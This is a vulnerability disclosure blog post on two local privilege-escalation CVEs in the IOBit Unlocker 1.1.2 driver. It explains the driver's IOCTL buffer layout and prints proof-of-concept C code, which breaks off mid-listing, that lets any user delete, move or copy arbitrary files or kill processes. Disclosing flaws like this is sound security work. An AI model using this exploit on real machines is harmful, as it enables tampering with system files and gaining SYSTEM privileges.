<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation · theevilbit blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Csaba Fitzl">
<meta name="description" content="IOBit’s Unlocker program is advertised to solve the following issues:

IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
and even:

With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">
<meta name="keywords" content="blog,macos,apple,security,vulnerability,exploit,cve">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2020-14974 & CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation">
  <meta name="twitter:description" content="IOBit’s Unlocker program is advertised to solve the following issues:
IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
and even:
With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">

<meta property="og:url" content="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">
  <meta property="og:site_name" content="theevilbit blog">
  <meta property="og:title" content="CVE-2020-14974 & CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation">
  <meta property="og:description" content="IOBit’s Unlocker program is advertised to solve the following issues:
IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.
and even:
With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2019-10-12T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-10-12T00:00:00+00:00">
    <meta property="article:tag" content="Lpe">
    <meta property="article:tag" content="Vulnerability">




<link rel="canonical" href="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">


<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="https://theevilbit.github.io/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">

<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://theevilbit.github.io/posts/iobit_unlocker_lpe/">
              CVE-2020-14974 &amp; CVE-2020-14975 - IOBit Unlocker 1.1.2 - Local Privilege Escalation
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2019-10-12T00:00:00Z">
                October 12, 2019
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              7-minute read
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/vulnerability/">Vulnerability</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p>IOBit’s Unlocker program is advertised to solve the following issues:</p>
<blockquote>
<p>IObit Unlocker performs well in solving “cannot delete files”, “access is denied”, “The file is in use by another program or user”, or “There has been a sharing violation” problems. With IObit Unlocker, you can manage all your files the way you want.</p></blockquote>
<p>and even:</p>
<blockquote>
<p>With “Unlock &amp; Delete”, “Unlock &amp; Rename”, “Unlock &amp; Move”, and “Unlock &amp; Copy”, IObit Unlocker offers easier ways to unlock and manage the files and folders to keep them safe and available.</p></blockquote>
<p>It can be downloaded from here: <a href="https://www.iobit.com/en/iobit-unlocker.php"  class="external-link" target="_blank" rel="noopener">IObit Unlocker, Solution for “undelete files or folders” Problems on Windows 8, 7, Vista, XP, 10 - IObit</a>. Right now the latest version is 1.1.2.</p>
<h2 id="overview">
  Overview
  <a class="heading-link" href="#overview">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The IOBitUnlocker driver contains 2 major vulnerabilities:</p>
<ol>
<li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to unlock a file - kill processes that holds a handle to the process, even if they are running with SYSTEM privileges (CVE-2020-14974)</li>
<li>The IOCTL code 0x222124 in the IOBitUnlocker driver allows a low privileged user to delete, move or copy any file on the system (CVE-2020-14975)</li>
</ol>
<h2 id="vulnerability-details">
  Vulnerability Details
  <a class="heading-link" href="#vulnerability-details">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The application installs a helper driver that will perform the above actions. If we examine the permissions of the device in OSR’s Device Tree, we can see that everyone has full access to the driver:</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.56.38.png" alt=""></p>
<p>Interestingly, when we start up the client application it will prompt for elevated access:</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2015.53.11.png" alt=""></p>
<p>To see what the client does, or how does it perform the actions, we can go with reversing the driver, but it’s easier to use @zodiacon’s <a href="https://github.com/zodiacon/DriverMon"  class="external-link" target="_blank" rel="noopener">DriverMon</a> tool, which can monitor IOCTL requests for us, and also show the data going on.</p>
<p>As we add files, we can see that there is an IOCTL code that seemingly seems to query information about the file - if any process is using it or not. This uses IOCTL code <code>0x222128</code>.</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.04.14.png" alt=""></p>
<p>If yes, we will get back the PID of the process using the file:</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.05.14.png" alt=""></p>
<p>If we click unlock, we will see a slightly different request, using IOCTL <code>0x222124</code>, again passing the filename and also number 3 at offset 0x424:</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.10.06.png" alt=""></p>
<p>If we look at the driver file in IDA, we will see that these are the two IOCTL code it will support.</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.12.57.png" alt=""></p>
<p>Playing around with the other option, this is what we can see in the requests in the relevant offsets:</p>
<ol>
<li>Unlock:
<ol>
<li>0x0: filename in unicode</li>
<li>0x424: byte 0x3</li>
</ol>
</li>
<li>Unlock and Delete:
<ol>
<li>0x0: filename in unicode</li>
<li>0x420: byte 0x1</li>
<li>0x424: byte 0x3</li>
</ol>
</li>
<li>Unlock and rename:
<ol>
<li>0x0: filename</li>
<li>0x210: new filename</li>
<li>0x420: byte 0x2</li>
<li>0x424: byte 0x3</li>
</ol>
</li>
<li>Unlock and move:
<ol>
<li>0x0: filename</li>
<li>0x210: new filename with full path</li>
<li>0x420: byte 0x3</li>
<li>0x424: byte 0x3</li>
</ol>
</li>
<li>Unlock and copy:
<ol>
<li>0x0: filename</li>
<li>0x210: new filename with full path</li>
<li>0x420: byte 0x4</li>
<li>0x424: byte 0x3</li>
</ol>
</li>
</ol>
<p>This is the input of a file rename operation:</p>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2023.53.48.png" alt=""></p>
<p>If we click <code>Force mode</code> the byte at offset 0x424 is set to 0x7. All the other bytes are 0 in the request. We can also conclude that the tool doesn’t support file paths over 256 bytes, which is the typical MAX_PATH value.
I believe the 4 byte return value is the NTSTATUS code. If we select a folder instead of a file, we got the same input values.</p>
<p>Considering that the access to the driver is full access to everyone, we can reimplement the same functionality in a code. This is a clear privilege escalation vulnerability as we can:</p>
<ol>
<li>delete, copy, move any file in the system</li>
<li>kill any process (the unlock feature will terminate processes holding handles to the file) - almost any, if we look at the code, we can see that there is a whitelist for critical system processes:</li>
</ol>
<p><img src="https://theevilbit.github.io/images/IOBit_Unlocker_LPE/Screenshot%202019-07-18%20at%2016.31.17.png" alt=""></p>
<p>The possibilities are endless with these capabilities. For example we can easily replace any binary running as SYSTEM, or copy a DLL to a location where it will be loaded as SYSTEM.</p>
<p>The only item that doesn’t work is renaming the file, for some reason if the user doesn’t have rights, the driver can’t rename it. All other items work.</p>
<p>Proof-of-concept C code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// UnlockExploit.cpp : This file contains the &#39;main&#39; function. Program execution begins and ends there.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">FileExists</span>(LPCWSTR szPath)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	DWORD dwAttrib <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFileAttributesW</span>(szPath);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] File exists status: 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwAttrib);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (dwAttrib <span style="color:#f92672">!=</span> INVALID_FILE_ATTRIBUTES);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReadStringFromSTDIN</span>(<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span> buffer)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fgetws</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)buffer, <span style="color:#ae81ff">0x200</span>, stdin);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>((LPVOID)((SIZE_T)buffer <span style="color:#f92672">+</span> (<span style="color:#a6e22e">lstrlenW</span>((LPCWSTR)buffer) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(WCHAR))), <span style="color:#ae81ff">0x00</span>, <span style="color:#66d9ef">sizeof</span>(WCHAR)); <span style="color:#75715e">//remove end of line character
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] IOBit Unlocker Privilege Escalation PoC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//open the driver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hDriver <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">IOBitUnlockerDevice&#34;</span>, GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, <span style="color:#ae81ff">0</span>, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hDriver <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] opened handle to the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		DWORD input_buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>		DWORD output_buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//allocate input buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		LPVOID input_buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, (SIZE_T)input_buffer_size, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (input_buffer <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate memory for input buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocated input memory buffer at: 0x%Ix</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (UINT64)input_buffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//allocate output buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		LPVOID output_buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, (SIZE_T)output_buffer_size, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (output_buffer <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate memory for output buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocated output buffer memory at: 0x%Ix</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (UINT64)output_buffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Clear memory area
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">memset</span>(input_buffer, <span style="color:#ae81ff">0x00</span>, input_buffer_size); 
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memset</span>(output_buffer, <span style="color:#ae81ff">0x00</span>, output_buffer_size);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter full path for the file to unlock. Eg: C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">cmd.exe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ReadStringFromSTDIN</span>((<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)input_buffer);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Fileto be checked: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span>)input_buffer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">FileExists</span>((LPCWSTR)input_buffer)) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] This file doesn&#39;t exists</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ExitProcess</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//print options
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] File found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Choose an option:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1 - INFO</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;2 - Unlock</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;3 - Unlock &amp; Delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;4 - Unlock &amp; Rename</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;5 - Unlock &amp; Move</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;6 - Unlock &amp; Copy</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		boolean valid <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> option <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>valid)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> <span style="color:#a6e22e">scanf_s</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>option);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> EOF) {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgetc</span>(stdin) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#75715e">// Read until a newline is found
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>					;
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (option <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> option <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				valid <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgetc</span>(stdin) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#75715e">// Read until a newline is found, if we don&#39;t do this it will mess up code later
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>					;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Invalid number, enter something between 1 and 6</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		DWORD dwIoctl_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x222128</span>;
</span></span><span style="display:flex;"><span>		DWORD dwIoctl_action <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x222124</span>;
</span></span><span style="display:flex;"><span>		DWORD dwBytesOut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (option)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_info, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[i] File info: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span>)output_buffer);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DeviceIoControl</span>(hDriver, dwIoctl_action, input_buffer, input_buffer_size, output_buffer, output_buffer_size, <span style="color:#f92672">&amp;</span>dwBytesOut, NULL);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#75715e">//this is not working id the user doesn&#39;t have rights to access the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		{
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x420</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2</span>;
</span></span><span style="display:flex;"><span>			((byte<span style="color:#f92672">*</span>)input_buffer)[<span style="color:#ae81ff">0x424</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Enter new filename:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
